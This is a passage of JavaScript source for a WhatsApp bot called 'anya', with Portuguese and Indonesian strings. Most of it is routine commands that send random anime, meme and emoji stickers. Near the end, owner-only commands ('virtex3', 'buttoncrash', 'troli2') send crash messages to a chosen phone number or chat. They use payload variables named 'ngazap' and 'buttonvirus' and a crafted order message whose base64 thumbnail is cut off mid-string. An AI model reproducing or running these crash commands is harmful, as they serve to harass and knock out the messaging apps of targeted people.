										"title": "[🧸] 𝐅𝐈𝐆𝐔 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄 [🧸]",
										"description": "figurinhas de anime",
										"rowId": `${prefix}figuanime`
									},
									{
										"title": "[🐒] 𝐅𝐈𝐆𝐔 𝐃𝐄 𝐌𝐀𝐆𝐀𝐆𝐎 [🐒]",
										"description": "figurinhas de macaco",
										"rowId": `${prefix}figumagago`
										},
									{
										"title": "[🥶] 𝐅𝐈𝐆𝐔 𝐃𝐄 𝐂𝐑𝐈𝐀 [🥶]",
										"description": "figurinhas de cria",
										"rowId": `${prefix}figudecria`
										},
										{
										"title": "[🧚🏻‍♀️] 𝐅𝐈𝐆𝐔 𝐃𝐀 𝐉𝐀𝐏𝐈𝐍𝐇𝐀️ [🧚🏻‍♀️]",
										"description": "figurinhas da japinha",
										"rowId": `${prefix}figujapinha`
										},
										{
										"title": "[😂] 𝐅𝐈𝐆𝐔 𝐃𝐄 𝐌𝐄𝐌𝐄️ [😂]",
										"description": "figurinhas de meme",
										"rowId": `${prefix}figumeme`
										},
										{
										"title": "[😃] 𝐅𝐈𝐆𝐔 𝐃𝐄 𝐄𝐌𝐎𝐉𝐈 [😃]",
										"description": "figurinhas de emoji",
										"rowId": `${prefix}figuemoji`
											}
								]
                           }                         
						],
                }
            anya.sendMessage(from, listMessage, {quoted:m})
}
break
case `figuanime`: {
                    
  if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var kaka = `${m.isGroup ? 'sim':'nao'}`
if(kaka == 'sim' && args.length < 1) return ReplyFig1() 
                   var figus = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24","figu25","figu26","figu27","figu28","figu29","figu30","figu32","figu33","figu34","figu35","figu36","figu37","figu38","figu39","figu40","figu41","figu42","figu43"]
                   var maths = []
                   
                   for (let i = 0; i < 4; i) {
                     figunime = `./figu/animes/` + figus[Math.floor(Math.random() * figus.length)] + `.webp`
                     if(maths.includes(figunime) === false) {
                       maths.push(figunime)
                       i++
                     }
                   }                                                  
                   if(args[0] == '-aqui') {
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figuanime`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE ANIME?_*`, `${watermark}`)        
                    }, 3000)
                    } else if(args[0] == '-pv') {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figuanime -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE ANIME?_*`, `${watermark}`)        
                    }, 3000)
                    }
                    if(kaka == 'nao' && args.length < 1) {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figuanime -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE ANIME?_*`, `${watermark}`)        
                    }, 3000)
}
                   }
                   break
case `figumeme`: {
                    
  if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
  var kaka = `${m.isGroup ? 'sim':'nao'}`
if(kaka == 'sim' && args.length < 1) return ReplyFig6() 
                   var meme = ["1", "2", "3", "4", "5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100","101","102","103","104","105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120","122","122","123","124","125","126","127","128","129","130"]
                   var maths = []                   
                   for (let i = 0; i < 4; i) {
                     figumeme = fs.readFileSync(`./figu/memes/` + meme[Math.floor(Math.random() * meme.length)] + `.webp`)
                     if(maths.includes(figumeme) === false) {
                       maths.push(figumeme)
                       i++
                     }
                   }
                    if(args[0] == '-aqui') {
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figumeme`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                    }, 3000)
                    } else if(args[0] == '-pv') {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figumeme -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                    }, 3000)
                    }
                    if(kaka == 'nao' && args.length < 1) {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figumeme -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                    }, 3000)
}
                   }
                   break 
case `figuemoji`: {
                    
  if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var kaka = `${m.isGroup ? 'sim':'nao'}`
if(kaka == 'sim' && args.length < 1) return ReplyFig5() 
                   var emoji = ["1", "2", "3", "4", "5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100","101","102","103"]
                   var maths = []
                   
                   for (let i = 0; i < 4; i) {
                     figumoji = `./figu/emoji/` + emoji[Math.floor(Math.random() * emoji.length)] + `.webp`
                     if(maths.includes(figumoji) === false) {
                       maths.push(figumoji)
                       i++
                     }
                   }
                   
                    if(args[0] == '-aqui') {
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figuemoji`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                    }, 3000)
                    } else if(args[0] == '-pv') {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figuemoji -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                    }, 3000)
                    }
                    if(kaka == 'nao' && args.length < 1) {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figuemoji -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                    }, 3000)
}
                   }
                   break
 case `figumagago`: {
  
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var kaka = `${m.isGroup ? 'sim':'nao'}`
if(kaka == 'sim' && args.length < 1) return ReplyFig4() 
                   const magagos = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24"]
                   var maths = []
                   
                   for (let i = 0; i < 4; i) {
                     figumagago = `./figu/macaco/` + magagos[Math.floor(Math.random() * magagos.length)] + `.webp`
                     if(maths.includes(figumagago) === false) {
                       maths.push(figumagago)
                       i++
                     }
                   }
                   
                    if(args[0] == '-aqui') {
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figumagago`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE MAGAGO?_*`, `${watermark}`)        
                    }, 3000)
                    } else if(args[0] == '-pv') {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figumagago -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE MAGAGO?_*`, `${watermark}`)        
                    }, 3000)
                    }
                    if(kaka == 'nao' && args.length < 1) {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figumagago -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE MAGAGO?_*`, `${watermark}`)        
                    }, 3000)
}
                   }
                   break
case `figujapinha`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var kaka = `${m.isGroup ? 'sim':'nao'}`
if(kaka == 'sim' && args.length < 1) return ReplyFig3() 
                   const japas = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24","figu25","figu26","figu27","figu28","figu29","figu30","figu32","figu33","figu34","figu35","figu36","figu37","figu38","figu39","figu40","figu41","figu42","figu43","figu44","figu45","figu46","figu47","figu48","figu49","figu50","figu51","figu52","figu53","figu54","figu55","figu56","figu57","figu58","figu58","figu59","figu60"]
                   var maths = []
                   
                   for (let i = 0; i < 4; i) {
                     figjapinha = `./figu/japinha/` + japas[Math.floor(Math.random() * japas.length)] + `.webp`
                     if(maths.includes(figjapinha) === false) {
                       maths.push(figjapinha)
                       i++
                     }
                   }
                   
                    if(args[0] == '-aqui') {
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figujapinha`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DA JAPINHA?_*`, `${watermark}`)        
                    }, 3000)
                    } else if(args[0] == '-pv') {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figujapinha -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DA JAPINHA?_*`, `${watermark}`)        
                    }, 3000)
                    }
                    if(kaka == 'nao' && args.length < 1) {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figujapinha -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DA JAPINHA?_*`, `${watermark}`)        
                    }, 3000)
}
                   }
                   break
   case `figudecria`: {
    
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var kaka = `${m.isGroup ? 'sim':'nao'}`
if(kaka == 'sim' && args.length < 1) return ReplyFig2() 
                   const decria = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24","figu25","figu26","figu27","figu28","figu29","figu30","figu32","figu33","figu34","figu35","figu36","figu37","figu38","figu39"]
                   var maths = []
                   
                   for (let i = 0; i < 4; i) {
                     figucria = `./figu/decria/` + decria[Math.floor(Math.random() * decria.length)] + `.webp`
                     if(maths.includes(figucria) === false) {
                       maths.push(figucria)
                       i++
                     }
                   }
                   
                    if(args[0] == '-aqui') {
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figudecria`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE CRIA?_*`, `${watermark}`)        
                    }, 3000)
                    } else if(args[0] == '-pv') {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figudecria -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE CRIA?_*`, `${watermark}`)        
                    }, 3000)
                    }
                    if(kaka == 'nao' && args.length < 1) {
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
                    setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}figudecria -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE CRIA?_*`, `${watermark}`)        
                    }, 3000)
}
                   }
                   break
case 'virtex3':{
if (!isCreator) throw mess.owner
if (!q) return m.reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6283834558105@s.whatsapp.net'
if (num == dev) return m.reply('Itu developer gua')
if (num == sender) return m.reply('itu nomor lu sendiri')
anya.sendMessage(num, {text:'anya crashando meu zapKKKKK'}, {quoted:ngazap})
await sleep(3000)
anya.sendMessage(num, {text:'anya crashando meu zapKKKKK'}, {quoted:ngazap})
await sleep(3000)
anya.sendMessage(num, {text:'anya crashando meu zapKKKKK'}, {quoted:ngazap})
await sleep(3000)
//mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'buttoncrash': 
if (!isCreator) return
var buttonskk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: ngazap}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: ngazap}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: `anya-bot`,
footerText: 'anya bot crashando seu zapkakaka',
buttons: buttonskk,
headerType: 1
}
anya.sendMessage(m.chat, buttonMessage)
 break
case 'troli2': {
if (!isCreator) return
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
						"orderId": "449756950375071",
						"thumbnail": "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